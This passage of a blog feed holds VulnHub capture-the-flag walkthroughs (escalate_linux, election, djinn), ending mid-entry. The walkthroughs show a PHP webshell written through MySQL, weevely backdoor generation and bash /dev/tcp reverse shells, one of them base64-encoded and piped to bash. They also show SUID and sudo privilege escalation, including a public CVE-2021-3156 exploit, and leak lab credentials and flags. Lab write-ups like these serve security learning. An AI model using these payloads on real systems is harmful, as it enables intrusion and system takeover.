PE</h2><p>enum manucal,we find there was a shell binary in /home/user3<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f07c5999b7c4f19bbec3c.png"></p><h2 id="No-2-user5-PE"><a href="#No-2-user5-PE" class="headerlink" title="No.2 user5 PE"></a>No.2 user5 PE</h2><p>in /home/user5, there was a script binary file,after we excute command follow user5’s .bash_history,we could get all the users hash<br>and we could crack root’s passwd <code>root:12345</code><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/656d3b8bc96a87b6f775c.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e0e34d95cf637152c7f3.png"></p><h2 id="No-3-user8-PE"><a href="#No-3-user8-PE" class="headerlink" title="No.3 user8 PE"></a>No.3 user8 PE</h2><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0a9da82e8dc8a8e7b2f97.png"><br>from user8’s history, we find the mysql config file,and find the pass of mysql<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/00d61d11d02d289a4152a.png"><br>and we seletc the password of user:mysql<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/14a132ed04e3349dc9af6.png"><br>and we find the cred of all user<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e293f2154ea3e24f017c3.png"></p><h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>user2 could use user1’s command,but we dont have user1’s passwd,but we could deduce user1 have the same format passwd <code>user1@12345</code>, and it was after trying.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/edd6f037e82469ea6dc5a.png"></p><h3 id="user8"><a href="#user8" class="headerlink" title="user8"></a>user8</h3><p>user8 have sudo for vi, so get the root shell by vi(GTFOBins)<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1a471ad7301b909259593.png"></p><h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p>cause my ability was limited and i was tired in the night,so i just find this way to PE. author say there was 12+ way of PE<br><a href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/51a2daeb41c21996e999c.png"></a><br><a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">escalate:1 download</a><br><a href="https://0xa1mn.medium.com/escalate-linux-vulnhub-walkthrough-1945a54d3c03">another walkthrough</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp election</title>
    <link href="/vulnhub-wp-election/"/>
    <url>/vulnhub-wp-election/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-host-discover"><a href="#🖳-host-discover" class="headerlink" title="🖳 host discover"></a>🖳 host discover</h1><p><em>sudo netdiscover -r 192.168.165.0/24</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                       <br>4 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 240                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.165.14  c6:3b:70:2b:33:1e      2     120  Unknown vendor                                                                                                       <br>192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                                                                                      <br>192.168.165.209 08:00:27:40:48:1a      1      60  PCS Systemtechnik GmbH<br></code></pre></td></tr></table></figure><p>target is <em>192.168.165.209</em></p><h1 id="👁-service-scan"><a href="#👁-service-scan" class="headerlink" title="👁 service scan"></a>👁 service scan</h1><p>nmap scan<br><em>sudo nmap -p- -sV -sC -Pn -oN nmap –min-rate 8000 192.168.165.209</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">···<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)<br>|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)<br>|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>MAC Address: 08:00:27:40:48:1A (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>···<br></code></pre></td></tr></table></figure><h1 id="🚪🚶-get-shell"><a href="#🚪🚶-get-shell" class="headerlink" title="🚪🚶 get shell"></a>🚪🚶 get shell</h1><p>the apache was 2.4.49,but after trying payload,it seems dont have path traversa<br>and we find four path in robots.txt,finally election work,other was 404.<br>and we could brute the phpmyadmin path by dirb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.165.209<br>···<br>---- Scanning URL: http://192.168.165.209/ ----<br>+ http://192.168.165.209/index.html (CODE:200|SIZE:10918)                                                                                                               <br>==&gt; DIRECTORY: http://192.168.165.209/javascript/                                                                                                                       <br>+ http://192.168.165.209/phpinfo.php (CODE:200|SIZE:95563)                                                                                                              <br>==&gt; DIRECTORY: http://192.168.165.209/phpmyadmin/                                                                                                                       <br>+ http://192.168.165.209/robots.txt (CODE:200|SIZE:30)                                                                                                                  <br>+ http://192.168.165.209/server-status (CODE:403|SIZE:280)            <br>···<br></code></pre></td></tr></table></figure><p>and we could login in it by <em>root:toor</em><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/42ccc3de0bda161b19f7b.png"><br>cause the <code>secure_file_priv</code> was empty,and we are root,so we could write webshell into the web</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select <span class="hljs-string">&quot;&lt;?php system(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span><br></code></pre></td></tr></table></figure><p>and visit it in web<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aa963e63af61754a3188f.png"><br>then download the weevely shell into the web.(generate by weevely)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">weevely generate password back.php<br></code></pre></td></tr></table></figure><ul><li><code>password</code> was the pass when connect<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/704f22ff687f27d4594e7.png"><br>and connect it.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e4ab0b21e6784d79af005.png"><br>this shell was not enough stable and powerful,use</li></ul><p><em>bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.165.130/443 0&gt;&amp;1’</em><br>bound reverse shell</p><h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><p>find suid binary file<br><em>find / -perm -u=s -type f 2&gt;/dev/null</em><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca74366ab531de896d598.png"><br>the Serv-U was exploit<br><em>searchsploit Serv-U</em><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eb2eb9a604d1520a5c62a.png"><br>and get the exploit to the target machine(by wget).<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4f91ed35aab15aeb2298f.png"></p><h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit hole"></a>rabbit hole</h2><p>when i run script <em>linpeas.sh</em>, it show /var/spool/cron/ was important, and i found there was <em>/crontabs/root</em> file,and <em>www-data</em> was the owner,have the rw right,so i spend lots of time to try it.but it all fail, cause this directory’s cron must belong to this user,such as <em>/crontabs/root</em> must belong to user:<em>root</em>, and the directory have the <em>drwx-wx–T</em> right, so only root could delete or change the file, even the file’s owner! so the <em>/crontabs/root</em> was fail to excute. cause <em>/crontabs/root</em>‘s owner was <em>www-data</em> not <em>root</em>, and the <em>www-data</em> cant change the owner of <em>/crontabs/root</em>.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc29f805067dbf5b46b5d.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e4c0a6f9fdfe7c7135b8d.png"></p><h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p><a href="https://www.vulnhub.com/entry/election-1,503/">election download</a><br><a href="https://medium.com/@chicxulub/election-1-vulnhub-walkthrough-341f7bfdf6bc">another’s walkthrough</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp djinn</title>
    <link href="/vulnhub-wp-djinn/"/>
    <url>/vulnhub-wp-djinn/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-host-discover"><a href="#🖳-host-discover" class="headerlink" title="🖳 host discover"></a>🖳 host discover</h1><p><em>sudo netdiscoer -r 192.168.165.0/24</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                       <br>5 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 300                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.165.14  c6:3b:70:2b:33:1e      3     180  Unknown vendor                                                                                                       <br>192.168.165.109 08:00:27:43:80:7b      1      60  PCS Systemtechnik GmbH                                                                                               <br>192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate          <br></code></pre></td></tr></table></figure><p>target was <em>192.168.165.109</em></p><h1 id="👁-service-scan"><a href="#👁-service-scan" class="headerlink" title="👁 service scan"></a>👁 service scan</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.165.109<br>···<br>PORT     STATE    SERVICE VERSION<br>21/tcp   open     ftp     vsftpd 3.0.3<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt<br>| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt<br>|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:192.168.165.130<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 3<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>22/tcp   filtered ssh<br>1337/tcp open     waste?<br>| fingerprint-strings: <br>|   NULL: <br>|     ____ _____ _ <br>|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ <br>|     \x20/ _ \x20 | | | | <span class="hljs-string">&#x27;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/</span><br><span class="hljs-string">|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|</span><br><span class="hljs-string">|     Let&#x27;</span>s see how good you are with simple maths<br>|     Answer my questions 1000 <span class="hljs-built_in">times</span> and I<span class="hljs-string">&#x27;ll give you your gift.</span><br><span class="hljs-string">|     &#x27;</span>-<span class="hljs-string">&#x27;, 8)</span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|     ____ _____ _ </span><br><span class="hljs-string">|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ </span><br><span class="hljs-string">|     \x20/ _ \x20 | | | | &#x27;</span>_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/<br>|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|<br>|     Let<span class="hljs-string">&#x27;s see how good you are with simple maths</span><br><span class="hljs-string">|     Answer my questions 1000 times and I&#x27;</span>ll give you your gift.<br>|_    <span class="hljs-string">&#x27;-&#x27;</span>, 1)<br>7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)<br>|_http-title: Lost <span class="hljs-keyword">in</span> space<br>|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+<br>···<br></code></pre></td></tr></table></figure><h1 id="🚪🚶-get-shell"><a href="#🚪🚶-get-shell" class="headerlink" title="🚪🚶 get shell"></a>🚪🚶 get shell</h1><p>port 21 have anonymous,and we get creds.txt,game.txt,message.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> message.txt          <br>@nitish81299 I am going on holidays <span class="hljs-keyword">for</span> few days, please take care of all the work. <br>And don<span class="hljs-string">&#x27;t mess up anything.</span><br><span class="hljs-string"></span><br><span class="hljs-string">cat game.txt </span><br><span class="hljs-string">oh and I forgot to tell you I&#x27;</span>ve setup a game <span class="hljs-keyword">for</span> you on port 1337. See <span class="hljs-keyword">if</span> you can reach to the <br>final level and get the prize.<br><br><span class="hljs-built_in">cat</span> creds.txt <br>nitu:81299<br></code></pre></td></tr></table></figure><p>we connect 1337 by nc,and find it was a game???</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 192.168.165.109 1337 <br>  ____                        _____ _                <br> / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ <br>| |  _ / _` | <span class="hljs-string">&#x27;_ ` _ \ / _ \   | | | | &#x27;</span>_ ` _ \ / _ \<br>| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/<br> \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|<br>                                                     <br><br>Let<span class="hljs-string">&#x27;s see how good you are with simple maths</span><br><span class="hljs-string">Answer my questions 1000 times and I&#x27;</span>ll give you your gift.<br>(9, <span class="hljs-string">&#x27;*&#x27;</span>, 8)<br>&gt; 72<br>(4, <span class="hljs-string">&#x27;-&#x27;</span>, 8)<br>&gt; -4<br>(1, <span class="hljs-string">&#x27;*&#x27;</span>, 7)<br>&gt; 7<br>(3, <span class="hljs-string">&#x27;/&#x27;</span>, 9)<br>&gt; 1/3<br>(4, <span class="hljs-string">&#x27;*&#x27;</span>, 4)<br>&gt; 16<br>(7, <span class="hljs-string">&#x27;*&#x27;</span>, 4)<br>&gt; 28<br>(9, <span class="hljs-string">&#x27;-&#x27;</span>, 1)<br>&gt; 8<br>(7, <span class="hljs-string">&#x27;-&#x27;</span>, 8)<br>&gt; -1<br>(9, <span class="hljs-string">&#x27;/&#x27;</span>, 3)<br>&gt; 3<br>(4, <span class="hljs-string">&#x27;-&#x27;</span>, 1)<br>&gt; <span class="hljs-built_in">exit</span><br>Stop acting like a hacker <span class="hljs-keyword">for</span> a damn minute!!<br></code></pre></td></tr></table></figure><p>it seems we need play 1000times,we try other port at first<br>we brute the path in 7331 web,and we find /wish and /genie<br>the /wish have a rce,so let’s try.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.165.130/443 0&gt;&amp;1&#x27;</span> | <span class="hljs-built_in">base64</span><br>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2NS4xMzAvNDQzIDA+JjEK<br><br><span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2NS4xMzAvNDQzIDA+JjEK | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>after we receive the shell,let’s enum,and we find user:nitish’s cred</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@djinn:/home/nitish$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 32<br>drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 .<br>drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..<br>-rw------- 1 root   root    130 Nov 12  2019 .bash_history<br>-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc<br>drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache<br>drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev<br>drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg<br>-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt<br>www-data@djinn:/home/nitish$ <span class="hljs-built_in">ls</span> -la .dev<br><span class="hljs-built_in">ls</span> -la .dev<br>total 12<br>drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .<br>drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 ..<br>-rw-r--r-- 1 nitish nitish   24 Oct 21  2019 creds.txt<br>www-data@djinn:/home/nitish$ <span class="hljs-built_in">cat</span> .dev/creds.txt<br><span class="hljs-built_in">cat</span> .dev/creds.txt<br>nitish:p4ssw0rdStr3r0n9<br>www-data@djinn:/home/nitish$ su nitish<br>su nitish<br>Password: p4ssw0rdStr3r0n9<br><br>nitish@djinn:~$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>nitish<br>nitish@djinn:~$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 32<br>drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 .<br>drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..<br>-rw------- 1 root   root    130 Nov 12  2019 .bash_history<br>-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc<br>drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache<br>drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev<br>drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg<br>-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt<br>nitish@djinn:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>10aay8289ptgguy1pvfa73alzusyyx3c<br>nitish@djinn:~$ <br></code></pre></td></tr></table></figure><p>so we get user.txt</p><h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><h2 id="sudo-exploit-PE"><a href="#sudo-exploit-PE" class="headerlink" title="sudo exploit PE"></a>sudo exploit PE</h2><p>when u are in practice,use kernel vulnerabilities as little as possible, if the designer’s idea of ​​elevating privileges is not kernel vulnerabilities<br>after check the system version and sudo version,it seems be exploit </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">nitish@djinn:/opt/80/templates$ lsb_release -a<br>lsb_release -a<br>No LSB modules are available.<br>Distributor ID:Ubuntu<br>Description:Ubuntu 18.04.3 LTS<br>Release:18.04<br>Codename:bionic<br>···<br>nitish@djinn:/opt/80/templates$ sudo -V<br>sudo -V<br>Sudo version 1.8.21p2<br>Sudoers policy plugin version 1.8.21p2<br>Sudoers file grammar version 46<br>Sudoers I/O plugin version 1.8.21p2<br></code></pre></td></tr></table></figure><p>so we could use this exploit:<code>https://github.com/worawit/CVE-2021-3156</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">nitish@djinn:~$ python3 exploit_sudo.py<br>python3 exploit_sudo.py<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ./proof.sh</span><br>./proof.sh<br>TERM environment variable not <span class="hljs-built_in">set</span>.<br>    _                        _             _ _ _ <br>   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |<br>  / _ \ | <span class="hljs-string">&#x27;_ ` _ \ / _` |_  / | &#x27;</span>_ \ / _` | | | |<br> / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|<br>/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)<br>                                     |___/       <br>djinn pwned...<br>__________________________________________________________________________<br><br>Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc<br>Path: /root<br>Date: Fri Mar 15 10:31:12 IST 2024<br>Whoami: root<br>__________________________________________________________________________<br><br>By @0xmzfr<br><br>Thanks to my fellow teammates <span class="hljs-keyword">in</span> @m0tl3ycr3w <span class="hljs-keyword">for</span> betatesting! :-)<br></code></pre></td></tr></table></figure><h2 id="default-PE"><a href="#default-PE" class="headerlink" title="default PE"></a>default PE</h2><p>there was a sudo binary file,we could find help by man<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6d14dce05c3e5b9c5c0da.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9ce703b91eb53e5f8589b.png"><br>by lots of try,i find we could get sam’s shell by this <code>-cmd</code><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3b8c991a8cc32ac4fdac0.png"><br>sam have the sudo too.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9f96c01e3855e6459e4cd.png"><br>after try,it seems nothing,let’s enum next<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b8378f56bf66f610250bd.png"><br>we just find the <code>.pyc</code> file in sam’s home,let’s uncompile it<br>first we need download it from machine,we could copy it to web directory or start a python web</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m SimpleHTTPServer <br></code></pre></td></tr></table></figure><p>and uncompiled it(by tools <em>uncompyle6</em>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">uncompyle6 .pyc<br><span class="hljs-comment"># uncompyle6 version 3.9.0</span><br><span class="hljs-comment"># Python bytecode version base 2.7 (62211)</span><br><span class="hljs-comment"># Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) </span><br><span class="hljs-comment"># [GCC 12.1.0]</span><br><span class="hljs-comment"># Embedded file name: /home/mzfr/scripts/exp.py</span><br><span class="hljs-comment"># Compiled at: 2019-11-07 21:05:18</span><br>from getpass import getuser<br>from os import system<br>from random import randint<br><br>def naughtyboi():<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Working on it!! &#x27;</span><br><br>def guessit():<br>    num = randint(1, 101)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Choose a number between 1 to 100: &#x27;</span><br>    s = input(<span class="hljs-string">&#x27;Enter your number: &#x27;</span>)<br>    <span class="hljs-keyword">if</span> s == num:<br>        system(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Better Luck next time&#x27;</span><br><br>def readfiles():<br>    user = getuser()<br>    path = input(<span class="hljs-string">&#x27;Enter the full of the file to read: &#x27;</span>)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;User %s is not allowed to read %s&#x27;</span> % (user, path)<br><br>def options():<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;What do you want to do ?&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;1 - Be naughty&#x27;</span><br>    <span 